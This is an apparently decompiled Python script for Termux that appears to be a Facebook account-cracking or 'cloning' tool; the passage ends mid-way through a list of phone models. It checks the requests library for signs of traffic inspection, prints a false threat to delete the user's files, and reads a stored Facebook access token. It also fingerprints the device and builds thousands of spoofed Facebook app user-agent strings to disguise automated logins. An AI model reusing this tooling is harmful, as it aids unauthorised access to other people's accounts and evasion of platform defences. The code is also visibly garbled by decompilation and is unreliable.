from os import path
from urllib.request import urlopen
import os
import base64
import zlib
import pip
import urllib
import urllib3
import sys
import re
import requests
import time
import random
import json
import string
import uuid
import subprocess
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import datetime
from string import *
from concurrent.futures import ThreadPoolExecutor as tred

def clr():
    data = os.listdir('/sdcard')
    if 'Android' in data:
        print(' \x1b[1;91m[!] ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! ')
        exit()
        return None
    None()
    return None
    exit()

from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'os.system' in x:
    clr()
if 'system' in x:
    clr()
if '(url)' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sdcard' in x:
    clr()
if "60*'='" in x:
    clr()
if "60 * '='" in x:
    clr()
if "'='" in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'open' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'open' in x:
    clr()
if 'echo' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'str(url)' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'l(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'n(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'r(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'RPW-ALEX1107GRAY' in x:
    clr()
if 'ALEX' in x:
    clr()
if 'if self.url' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'blob' in x:
    clr()
if '.txt' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'approvalSheet' in x:
    clr()
if 'approval' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'open' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'system' in x:
    clr()
if 'M4786==' in x:
    clr()
if 'M1107==' in x:
    clr()
if 'os.system' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'e(url)' in x:
    clr()
if 'g(url)' in x:
    clr()
if 'h(url)' in x:
    clr()
if 'i(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{data}' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release', shell = True).decode('utf-8').replace('\n', '')
model = subprocess.check_output('getprop ro.product.model', shell = True).decode('utf-8').replace('\n', '')
build = subprocess.check_output('getprop ro.build.id', shell = True).decode('utf-8').replace('\n', '')
fblc = 'zh_HK'
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
fbcr = 'TNT'
fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell = True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output('getprop ro.product.brand', shell = True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = subprocess.check_output('getprop ro.build.version.release', shell = True).decode('utf-8').replace('\n', '')
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell = True).decode('utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell = True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell = True).decode('utf-8').replace('\n', '')
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')
total = 0
for i in fbcr:
    total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
if select == '2':
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[1].replace('\n', '')
    sim_id += fbcr
    if Exception:
        e = None
        fbcr = 'Zong'
        sim_id += fbcr
        e = None
        del e
        e = None
        del e
fbcr = 'Zong'
sim_id += fbcr
fbcr = 'Zong'
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm }

def clear():
    os.system('clear')


def back():
    login()


def alex(ids):
    if len(ids) == 15:
        if ids[:10] in ('1000000000',):
            alif = '2009'
        if ids[:9] in ('100000000',):
            alif = '2009'
        if ids[:8] in ('10000000',):
            alif = '2009'
        if ids[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
            alif = '2009'
        if ids[:7] in ('1000006', '1000007', '1000008', '1000009'):
            alif = '2010'
        if ids[:6] in ('100001',):
            alif = '2010-2011'
        if ids[:6] in ('100002', '100003'):
            alif = '2011-2012'
        if ids[:6] in ('100004',):
            alif = '2012-2013'
        if ids[:6] in ('100005', '100006'):
            alif = '2013-2014'
        if ids[:6] in ('100007', '100008'):
            alif = '2014-2015'
        if ids[:6] in ('100009',):
            alif = '2015'
        if ids[:5] in ('10001',):
            alif = '2015-2016'
        if ids[:5] in ('10002',):
            alif = '2016-2017'
        if ids[:5] in ('10003',):
            alif = '2018-2019'
        if ids[:5] in ('10004',):
            alif = '2019-2020'
        if ids[:5] in ('10005',):
            alif = '2020'
        if ids[:5] in ('10006', '10007', ''):
            alif = '2021'
        if ids[:5] in ('10008',):
            alif = '2022'
        if ids[:5] in ('10009',):
            alif = '2023'
        alif = ''
    if len(ids) in (9, 10):
        alif = '2008-2009'
    if len(ids) == 8:
        alif = '2007-2008'
    if len(ids) == 7:
        alif = '2006-2007 '
    if len(ids) in (13, 14):
        alif = '2023-2024'
    alif = ''
    return alif

ah = 'ALEX-'
imt = '-M1107=='
ak = ' RPW-'
myid = uuid.uuid4().hex[:10].upper()
key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
kok = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
kok.write(myid + imt)
kok.close()

def login():
    token = open('.token.txt', 'r').read()
    tokenku.append(token)
    sy = requests.get('https://graph.facebook.com/me?access_token=' + tokenku[0])
    public_menu()
    return None
    if KeyError:
        Public()
        return None
    if None.exceptions.ConnectionError:
        clear()
        print(logo)
        print(' [×] Connection Timeout')
        exit()
        return None
    if IOError:
        Public()
        return None


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        return None

ugen = []
useragent = []
useragent1 = []
for alexbgraph in range(5000):
    a1 = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';'
    a2 = '[FBAN/Orca-Android;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBPN/com.facebook.orca;FBLC/'
    a3 = 'en_US'
    a4 = ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBCR/'
    a5 = random.choice([
        'GLOBE',
        'TNT',
        'SMART',
        'DITO',
        'TM',
        'Verizon'])
    a6 = ';FBMF/'
    a7 = random.choice([
        'samsung',
        'infinix',
        'xiaomi',
        'vivo',
        'oppo',
        'motorola',
        'realme',
        'asus',
        'sony',
        'tecno',
        'itel',
        'meizu'])
    if a7 == 'meizu':
        a11 = random.choice([
            'Meizu 18s',
            'Meizu 18',
            'Meizu 17 Pro',
            'Meizu 17',
            'Meizu 16s Pro',
            'Meizu 16s',
            'Meizu 16T',
            'Meizu 16Xs',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16 Max',
            'Meizu 16 Note',
            'Meizu 16s Plus',
            'Meizu 16',
            'Meizu 16X',
            'Meizu 16th Plus',
            'Meizu 16th',
            'Meizu 15 Plus',
            'Meizu 15',
            'Meizu 15 Lite',
            'Meizu M6T',
            'Meizu M6s',
            'Meizu M6 Note',
            'Meizu M6',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5',
            'Meizu M5c',
            'Meizu M5s',
            'Meizu M5 Note',
            'Meizu M5'])
    if a7 == 'itel':
        a11 = random.choice([
            'S41',
            'S31',
            'S21',
            'S12',
            'S11',
            'A56',
            'A55',
            'A54',
            'A23',
            'A16',
            'A15',
            'P36 Pro',
            'P36',
            'P33 Plus',
            'P33',
            'P32',
            'P31',
            'A88',
            'A47',
            'A46',
            'A45',
            'A44',
            'A41 Plus',
            'A41',
            'A25 Pro',
            'A25',
            'A23 Pro',
            'A22 Pro',
            'A22',
            'A21',
            'A16 Plus',
            'A16S',
            'A16',
            'A14',
            'A13 Plus',
            'A13',
            'A11',
            'A10',
            'Vision 1 Plus',
            'Vision 1',
            'S13 Pro',
            'S13',
            'S12 Lite',
            'S11 Lite',
            'S11 Pro',
            'S11 Plus',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10',
            'S15',
            'S14',
            'S13P',
            'S12',
            'S11',
            'S10'])
    if a7 == 'tecno':
        a11 = random.choice([
            'Camon 16 Premier',
            'Camon 16 Pro',
            'Camon 16',
            'Camon 15 Premier',
            'Camon 15 Pro',
            'Camon 15',
            'Spark 6',
            'Spark 5 Pro',
            'Spark 5',
            'Pova',
            'Pouvoir 4 Pro',
            'Pouvoir 4',
            'Phantom 9',
            'Phantom X',
            'Camon 12 Pro',
            'Camon 12',
            'Camon 11',
            'Camon 11 Pro',
            'Camon 11S',
            'Spark 4',
            'Spark 4 Air',
            'Spark 3 Pro',
            'Spark 3',
            'Spark 2',
            'Pouvoir 3 Plus',
            'Pouvoir 3',
            'Phantom 8',
            'Phantom 6',
            'Phantom 6 Plus',
            'Camon X Pro',
            'Camon X',
            'Camon CM',
            'Camon CX Air',
            'Camon CX',
            'Spark Plus K9',
            'Spark K7',
            'Spark Plus K9',
            'Spark K7 Plus',
            'Boom J8',
            'Boom J7',
            'Boom J5',
            'Boom J9 Plus',
            'Boom J10',
            'Pop 3',
            'Pop 2 Plus',
            'Pop 2 Power',
            'Pop 2F',
            'Pop 1',
            'F1',
            'F2',
            'F3',
            'F4',
            'F5'])
    if a7 == 'sony':
        a11 = random.choice([
            'Xperia 1',
            'Xperia 5',
            'Xperia 10',
            'Xperia L4',
            'Xperia XZ3',
            'Xperia XZ2',
            'Xperia XZ1',
            'Xperia XA2',
            'Xperia XA1',
            'Xperia XZs',
            'Xperia XZ',
            'Xperia X Compact',
            'Xperia XA Ultra',
            'Xperia XA',
            'Xperia X Performance',
            'Xperia XA1 Ultra',
            'Xperia XA2 Ultra',
            'Xperia XZ2 Premium',
            'Xperia XZ2 Compact',
            'Xperia 10 Plus',
            'Xperia L3',
            'Xperia 1 II',
            'Xperia 5 II',
            'Xperia 10 II',
            'Xperia 10 III',
            'Xperia L5',
            'Xperia XZ4',
            'Xperia XZ4 Compact',
            'Xperia XZ Premium',
            'Xperia XZ1 Compact',
            'Xperia XA3',
            'Xperia XA4',
            'Xperia XA5',
            'Xperia XA6',
            'Xperia XA7',
            'Xperia XA8',
            'Xperia XA9',
            'Xperia XA10',
            'Xperia XA11',
            'Xperia XA12',
            'Xperia XA13',
            'Xperia XA14',
            'Xperia XA15',
            'Xperia XA16',
            'Xperia XA17',
            'Xperia XA18',
            'Xperia XA19',
            'Xperia XA20',
            'Xperia XA21',
            'Xperia XA22',
            'Xperia XA23',
            'Xperia XA24',
            'Xperia XA25',
            'Xperia XA26',
            'Xperia XA27',
            'Xperia XA28',
            'Xperia XA29',
            'Xperia XA30',
            'Xperia XA31',
            'Xperia XA32',
            'Xperia XA33',
            'Xperia XA34',
            'Xperia XA35',
            'Xperia XA36',
            'Xperia XA37',
            'Xperia XA38',
            'Xperia XA39',
            'Xperia XA40',
            'Xperia XA41',
            'Xperia XA42'])
    if a7 == 'asus':
        a11 = random.choice([
            'ZenFone 8',
            'ROG Phone 5',
            'ZenFone 7',
            'ROG Phone 3',
            'ZenFone 6',
            'ROG Phone II',
            'ZenFone 5Z',
            'ZenFone 5',
            'ZenFone 4 Pro',
            'ZenFone 4',
            'ZenFone 3 Deluxe',
            'ZenFone 3',
            'ZenFone 2 Laser',
            'ZenFone 2',
            'ZenFone',
            'ZenFone 6Z',
            'ZenFone Max Pro (M2)',
            'ZenFone Max Pro (M1)',
            'ZenFone 6Z',
            'ZenFone Max Plus (M2)',
            'ZenFone Max (M2)',
            'ZenFone Max (M1)',
            'ZenFone Live',
            'ZenFone Zoom',
            'ZenFone Selfie',
            'ASUS_Z01RD',
            'ASUS_Z01QD',
            'ASUS_I01WD',
            'ASUS_I01BD',
            'ASUS_I01HDA'])
    if a7 == 'realme':
        a11 = random.choice([
            'RMX3516',
            'RMX3371',
            'RMX3461',
            'RMX3286',
            'RMX3561',
            'RMX3388',
            'RMX3311',
            'RMX3142',
            'RMX2071',
            'RMX1805',
            'RMX1809',
            'RMX1801',
            'RMX1807',
            'RMX1803',
            'RMX1825',
            'RMX1821',
            'RMX1822',
            'RMX1833',
            'RMX1851',
            'RMX1853',
            'RMX1827',
            'RMX1911',
            'RMX1919',
            'RMX1927',
            'RMX1971',
            'RMX1973',
            'RMX2030',
            'RMX2032',
            'RMX1925',
            'RMX1929',
            'RMX2001',
            'RMX2061',
            'RMX2063',
            'RMX2040',
            'RMX2042',
            'RMX2002',
            'RMX2151',
            'RMX2163',
            'RMX2155',
            'RMX2170',
            'RMX2103',
            'RMX3085',
            'RMX3241',
            'RMX3081',
            'RMX3151',
            'RMX3381',
            'RMX3521',
            'RMX3474',
            'RMX3471',
            'RMX3472',
            'RMX3392',
            'RMX3393',
            'RMX3491',
            'RMX1811',
            'RMX2185',
            'RMX3231',
            'RMX2189',
            'RMX2180',
            'RMX2195',
            'RMX2101',
            'RMX1941',
            'RMX1945',
            'RMX3063',
            'RMX3061',
            'RMX3201',
            'RMX3203',
            'RMX3261',
            'RMX3263',
            'RMX3193',
            'RMX3191',
            'RMX3195',
            'RMX3197',
            'RMX3265',
            'RMX3268',
            'RMX3269',
            'RMX2027',
            'RMX2020',
            'RMX2021',
            'RMX3581',
            'RMX3501',
            'RMX3503',
            'RMX3511',
            'RMX3310',
            'RMX3312',
            'RMX3551',
            'RMX3301',
            'RMX3300',
            'RMX2202',
            'RMX3363',
            'RMX3360',
            'RMX3366',
            'RMX3361',
            'RMX3031',
            'RMX3370',
            'RMX3357',
            'RMX3560',
            'RMX3562',
            'RMX3350',
            'RMX2193',
            'RMX2161',
            'RMX2050',
            'RMX2156',
            'RMX3242',
            'RMX3171',
            'RMX3430',
            'RMX3235',
            'RMX3506',
            'RMX2117',
            'RMX2173',
            'RMX3161',
            'RMX2205',
            'RMX3462',
            'RMX3478',
            'RMX3372',
            'RMX3574',
            'RMX1831',
            'RMX3121',
            'RMX3122',
            'RMX3125',
            'RMX3043',
            'RMX3042',
            'RMX3041',
            'RMX3092',
            'RMX3093',
            'RMX3571',
            'RMX3475',
            'RMX2200',
            'RMX2201',
            'RMX2111',
            'RMX2112',
            'RMX1901',
            'RMX1903',
            'RMX1992',
            'RMX1993',
            'RMX1991',
            'RMX1931',
            'RMX2142',
            'RMX2081',
            'RMX2085',
            'RMX2083',
            'RMX2086',
            'RMX2144',
            'RMX2051',
            'RMX2025',
            'RMX2075',
            'RMX2076',
            'RMX2072',
            'RMX2052',
            'RMX2176',
            'RMX2121',
            'RMX3115',
            'RMX1921'])
    if a7 == 'motorola':
        a11 = random.choice([
            'Moto G100',
            'Moto G60',
            'Moto G40 Fusion',
            'Moto G30',
            'Moto G9 Power',
            'Moto G8',
            'Moto G Power 2022',
            'Moto G7',
            'Moto G Stylus 2022',
            'Motorola Edge 20 Pro',
            'Motorola Edge 20',
            'Motorola Edge 20 Lite',
            'Motorola Moto G Stylus (2021)',
            'Motorola Moto G Power (2021)',
            'Motorola Moto G Play (2021)',
            'Motorola Moto G9 Plus',
            'Motorola Moto G9',
            'Motorola Moto G8 Plus',
            'Motorola Moto G8 Power',
            'Motorola Moto G8',
            'Motorola Moto G7 Plus',
            'Motorola Moto G7 Power',
            'Motorola Moto G7 Play',
            'Motorola Moto G7',
            'Motorola Moto G6 Plus',
            'Motorola Moto G6',
            'Motorola Moto G5S Plus',
            'Motorola Moto G5 Plus',
            'Motorola Moto G5',
            'Motorola Moto G4 Plus',
            'Motorola Moto G4',
            'Motorola Moto X4',
            'Motorola Moto X (2nd Gen)',
            'Motorola Moto X',
            'Motorola Moto Z3 Play',
            'Motorola Moto Z2 Play',
            'Motorola Moto Z',
            'Motorola Moto E7 Plus',
            'Motorola Moto E6 Plus',
            'Motorola Moto E5 Plus',
            'Motorola Moto E4 Plus',
            'Motorola Moto E (2nd Gen)',
            'Motorola Moto E',
            'XT2127-2',
            'XT2127-4',
            'XT2127-5',
            'XT2127-6',
            'XT2127-7',
            'XT2127-8',
            'XT2127-10',
            'XT2127-11',
            'XT2127-12',
            'XT2127-13',
            'XT2127-14',
            'XT2127-15',
            'XT2127-16',
            'XT2127-17',
            'XT2127-18',
            'XT2127-19',
            'XT2127-20',
            'XT2127-21',
            'XT2127-22',
            'XT2127-23',
            'XT2127-24',
            'XT2127-25',
            'XT2127-26',
            'XT2127-27',
            'XT2127-28',
            'XT2127-29',
            'XT2127-30',
            'XT2127-31',
            'XT2127-32',
            'XT2127-33',
            'XT2127-34',
            'XT2127-35',
            'XT2127-36',
            'XT2127-37',
            'XT2127-38',
            'XT2127-39',
            'XT2127-40',
            'XT2127-41',
            'XT2127-42',
            'XT2127-43',
            'XT2127-44',
            'XT2127-45',
            'XT2127-46',
            'XT2127-47',
            'XT2127-48',
            'XT2127-49',
            'XT2127-50',
            'XT2127-51',
            'XT2127-52',
            'XT2127-53',
            'XT2127-54',
            'XT2127-55',
            'XT2127-56',
            'XT2127-57',
            'XT2127-58',
            'XT2127-59',
            'XT2127-60',
            'XT2127-61',
            'XT2127-62',
            'XT2127-63',
            'XT2127-64',
            'XT2127-65',
            'XT2127-66',
            'XT2127-67',
            'XT2127-68',
            'XT2127-69',
            'XT2127-70',
            'XT2127-71',
            'XT2127-72',
            'XT2127-73',
            'XT2127-74',
            'XT2127-75',
            'XT2127-76',
            'XT2127-77',
            'XT2127-78',
            'XT2127-79',
            'XT2127-80',
            'XT2127-81',
            'XT2127-82',
            'XT2127-83',
            'XT2127-84',
            'XT2127-85',
            'XT2127-86',
            'XT2127-87',
            'XT2127-88',
            'XT2127-89',
            'XT2127-90',
            'XT2127-91',
            'XT2127-92',
            'XT2127-93',
            'XT2127-94',
            'XT2127-95',
            'XT2127-96',
            'XT2127-97',
            'XT2127-98',
            'XT2127-99',
            'XT2127-100',
            'XT2127-101',
            'XT2127-102',
            'XT2127-103',
            'XT2127-104',
            'XT2127-105',
            'XT2127-106',
            'XT2127-107',
            'XT2127-108',
            'XT2127-109',
            'XT2127-110',
            'XT2127-111',
            'XT2127-112',
            'XT2127-113',
            'XT2127-114',
            'XT2127-115',
            'XT2127-116',
            'XT2127-117',
            'XT2127-118',
            'XT2127-119',
            'XT2127-120',
            'XT2127-121',
            'XT2127-122',
            'XT2127-123',
            'XT2127-124',
            'XT2127-125',
            'XT2127-126',
            'XT2127-127',
            'XT2127-128',
            'XT2127-129',
            'XT2127-130',
            'XT2127-131',
            'XT2127-132',
            'XT2127-133',
            'XT2127-134',
            'XT2127-135',
            'XT2127-136',
            'XT2127-137',
            'XT2127-138',
            'XT2127-139',
            'XT2127-140',
            'XT2127-141',
            'XT2127-142',
            'XT2127-143',
            'XT2127-144',
            'XT2127-145',
            'XT2127-146',
            'XT2127-147',
            'XT2127-148',
            'XT2127-149',
            'XT2127-150',
            'XT2127-151',
            'XT2127-152',
            'XT2127-153'])
    if a7 == 'oppo':
        a11 = random.choice([
            'Reno 7 Pro',
            'Reno 7',
            'Reno 6 Pro+',
            'A95',
            'A96',
            'A93',
            'Oppo Find X3 Pro',
            'Oppo Find X2 Pro',
            'Oppo Find X2',
            'Oppo Reno 6 Pro+',
            'Oppo Reno 6 Pro',
            'Oppo Reno 6',
            'Oppo Reno 5 Pro+',
            'Oppo Reno 5 Pro',
            'Oppo Reno 5',
            'Oppo A94',
            'Oppo A74',
            'Oppo F19 Pro+',
            'Oppo F19 Pro',
            'Oppo F19',
            'Oppo A93',
            'Oppo A53',
            'Oppo A33',
            'Oppo A32',
            'Oppo A72',
            'Oppo A52',
            'Oppo A92',
            'Oppo A12',
            'Oppo Reno 3 Pro',
            'Oppo Reno 3',
            'Oppo Reno 2',
            'Oppo Reno',
            'Oppo K7x',
            'Oppo K7',
            'Oppo A9 (2020)',
            'Oppo A5 (2020)',
            'CPH1903',
            'CPH1803',
            'CPH1859',
            'CPH1969',
            'CPH1989',
            'CPH1919',
            'CPH1941',
            'CPH1983',
            'CPH1963',
            'CPH1879',
            'CPH1831',
            'CPH2035',
            'CPH2069',
            'CPH1987',
            'CPH2071',
            'CPH2083',
            'CPH2015',
            'CPH2019',
            'CPH2173',
            'CPH2089',
            'CPH2067',
            'CPH2017',
            'CPH2087',
            'CPH2205',
            'CPH2251',
            'CPH2197',
            'CPH2235',
            'CPH2347',
            'CPH2295',
            'CPH2249',
            'CPH2243',
            'CPH2349',
            'CPH2359',
            'CPH2383',
            'CPH2381',
            'CPH2239',
            'CPH2213',
            'CPH2129',
            'CPH2195',
            'CPH2227',
            'CPH2316',
            'CPH2353',
            'CPH2261',
            'CPH2225',
            'CPH2269',
            'CPH2073',
            'CPH2185',
            'CPH1877',
            'CPH2013',
            'CPH2061',
            'CPH1955',
            'CPH1871',
            'CPH1801',
            'CPH1873',
            'CPH1901',
            'CPH1809',
            'CPH1853',
            'CPH1923',
            'CPH1981',
            'CPH1833',
            'CPH1917',
            'CPH1967',
            'CPH1937',
            'CPH1893',
            'CPH1931',
            'CPH1921',
            'CPH1823',
            'CPH2023',
            'CPH2021',
            'CPH2103',
            'CPH2220',
            'CPH2127',
            'CPH2059',
            'CPH2139',
            'CPH2253',
            'CPH2267',
            'CPH2263',
            'CPH2247',
            'CPH2241',
            'CPH2297',
            'CPH2357',
            'CPH2255',
            'CPH2345',
            'CPH2329',
            'CPH2209',
            'CPH2191',
            'CPH2199',
            'CPH2289',
            'CPH2319',
            'CPH2343',
            'CPH2363',
            'CPH2161',
            'CPH2163',
            'CPH1979',
            'CPH1977',
            'CPH1973',
            'CPH1965',
            'CPH1959',
            'CPH1951',
            'CPH1913',
            'CPH1909',
            'CPH1905',
            'CPH1861',
            'CPH1863',
            'CPH1967',
            'CPH1933',
            'CPH1937',
            'CPH1921',
            'CPH1923',
            'CPH1987',
            'CPH1919',
            'CPH1897',
            'CPH1875',
            'CPH1874',
            'CPH1872',
            'CPH1865',
            'CPH1863',
            'CPH1862',
            'CPH1853',
            'CPH1852',
            'CPH1851',
            'CPH1843',
            'CPH1841',
            'CPH1835',
            'CPH1833',
            'CPH1832',
            'CPH1831',
            'CPH1825',
            'CPH1823',
            'CPH1821',
            'CPH1819',
            'CPH1813',
            'CPH1812',
            'CPH1811',
            'CPH1809',
            'CPH1808',
            'CPH1807',
            'CPH1805',
            'CPH1803',
            'CPH1801'])
    if a7 == 'vivo':
        a11 = random.choice([
            'Vivo_X60_Pro',
            'Vivo_X50_Pro',
            'Vivo_X30_Pro',
            'Vivo_X27',
            'Vivo_X23',
            'Vivo_X21',
            'Vivo_V21',
            'Vivo_V17',
            'Vivo_V15',
            'Vivo_V11',
            'Vivo_V9',
            'Vivo_Y95',
            'Vivo_Y91',
            'Vivo_Y81',
            'Vivo_Y71',
            'Vivo_S1',
            'V2056',
            'V2112A',
            'V2112',
            'V2122A',
            'V2120A',
            'V2120',
            'V2116A',
            'V2114A',
            'V2112A',
            'V2010A',
            'V2019A',
            'V2010',
            'V2003A',
            'V2002A',
            'V2002',
            'V1932A',
            'V1932T',
            'V1932',
            'V1929A',
            'V1928A',
            'V1928T',
            'V1928',
            'V1927A',
            'V1926A',
            'V1925A',
            'V1925',
            'V1924A',
            'V1922A',
            'V1921A',
            'V1921',
            'V1920A',
            'V1919A',
            'V1916A',
            'V1916',
            'V1912A',
            'V1911A',
            'V1910A',
            'V1910',
            'V1909A',
            'V1907A',
            'V1905',
            'V1903A',
            'V1901A',
            'V1901T',
            'V1901',
            'V1836',
            'V1824A',
            'V1824T',
            'V1824',
            'V1818A',
            'V1818T',
            'V1813A',
            'V1813T',
            'V1813',
            'V1812A',
            'V1811A',
            'V1811T',
            'V1811',
            'V1808A',
            'V1808T',
            'V1808',
            'V1801A',
            'V1801T',
            'V1801',
            'V1730T',
            'V1730F',
            'V1730A',
            'V1730',
            'V1724A',
            'V1723A',
            'V1723',
            'V1721A',
            'V1720A',
            'V1720T',
            'V1720',
            'V1716A',
            'V1715A',
            'V1715',
            'V1713A',
            'V1713',
            'V1712A',
            'V1712',
            'V1711T',
            'V1711A',
            'V1711',
            'V1709A',
            'V1709T',
            'V1709',
            'V1708A',
            'V1708T',
            'V1707A',
            'V1707T',
            'V1706T',
            'V1706',
            'V1703A',
            'V1701A',
            'V1701',
            'V1624A',
            'V1623A',
            'V1622A',
            'V1622',
            'V1621A',
            'V1619',
            'V1618A',
            'V1617A',
            'V1616',
            'V1615T',
            'V1614T',
            'V1613',
            'V1611T',
            'V1611',
            'V1608A',
            'V1609',
            'V1605',
            'V1604',
            'V1603',
            'V1601',
            'V1570',
            'V1562',
            'V1561',
            'V1550',
            'V1548',
            'V1546',
            'V1543',
            'V1542',
            'V1540',
            'V1530',
            'V1520',
            'V1510',
            'V1500',
            'V1420',
            'V1400',
            'V1310',
            'V1320'])
    if a7 == 'xiaomi':
        a11 = random.choice([
            'Mi 11',
            'Mi 10 Pro',
            'Mi 9T',
            'M2101K7AG',
